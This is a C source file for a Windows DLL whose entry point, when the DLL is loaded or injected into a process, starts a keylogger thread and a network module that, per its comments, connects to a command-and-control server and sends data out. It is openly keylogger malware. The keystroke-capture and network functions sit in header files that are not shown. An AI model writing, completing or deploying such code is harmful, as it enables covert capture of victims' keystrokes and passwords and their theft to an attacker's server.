#include <Windows.h>
#include "keylogger.h"
#include "network.h"

// DLL Entry Point
// Called when DLL is loaded or unloaded from a process
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {

    case DLL_PROCESS_ATTACH:
        // DLL is being loaded into a process

        // Disable DLL_THREAD_ATTACH/DETACH notifications for performance
        DisableThreadLibraryCalls(hModule);

        // Initialize network module (reads config, connects to C2, starts sender thread)
        InitNetwork(hModule);

        // Start the keylogger thread
        if (!StartKeylogger()) {
            // Failed to start keylogger
            // Return FALSE would prevent DLL from loading,
            // but we return TRUE to allow injection to complete
            // (the DLL is still useful for other purposes during testing)
        }
        break;

    case DLL_PROCESS_DETACH:
        // DLL is being unloaded from a process

        // Stop the keylogger thread gracefully
        StopKeylogger();

        // Cleanup network module (final flush, close socket)
        CleanupNetwork();
        break;

    case DLL_THREAD_ATTACH:
        // A new thread is being created in the process
        // (disabled by DisableThreadLibraryCalls)
        break;

    case DLL_THREAD_DETACH:
        // A thread is exiting cleanly
        // (disabled by DisableThreadLibraryCalls)
        break;
    }

    return TRUE;
}
